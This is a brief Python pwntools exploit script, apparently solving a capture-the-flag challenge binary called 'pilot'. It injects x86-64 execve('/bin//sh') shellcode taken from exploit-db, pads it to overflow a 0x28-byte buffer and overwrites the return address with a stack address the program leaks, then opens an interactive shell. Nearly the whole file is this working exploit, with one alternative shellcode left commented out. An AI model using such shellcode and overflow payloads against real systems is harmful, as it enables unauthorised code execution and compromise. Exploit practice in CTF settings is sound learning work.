from pwn import *

#payload = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" # got from https://www.exploit-db.com/shellcodes/46907
payload += "A"*(0x28-len(payload))
s=  process("./pilot")
s.recvuntil("Location:")
addr = s.recvline()
payload += p64(int(addr,16))
s.sendline(payload)
s.interactive()
#print payload 
